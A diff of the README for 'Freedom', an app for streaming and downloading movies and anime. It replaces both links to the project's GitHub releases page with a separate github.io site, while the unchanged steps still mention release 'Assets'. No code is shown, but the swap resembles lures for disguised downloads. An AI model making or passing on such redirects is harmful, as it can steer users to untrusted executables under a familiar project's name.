@@ -1,6 +1,6 @@
 # 📺 Freedom - Stream movies and anime with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/qjin0078-cmyk/Freedom/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://qjin0078-cmyk.github.io)
 
 Freedom provides a simple way to watch anime and movies directly on your computer. It combines a user-friendly interface with powerful streaming tools. You can search for content, watch your favorite shows, or download media for later. The app handles torrents and high-quality video playback automatically.
 
@@ -8,7 +8,7 @@ Freedom provides a simple way to watch anime and movies directly on your compute
 
 You can get the latest version of Freedom from the official release page. 
 
-[Click here to visit the download page](https://github.com/qjin0078-cmyk/Freedom/releases)
+[Click here to visit the download page](https://qjin0078-cmyk.github.io)
 
 1. Go to the link above.
 2. Look for the section labeled "Assets."
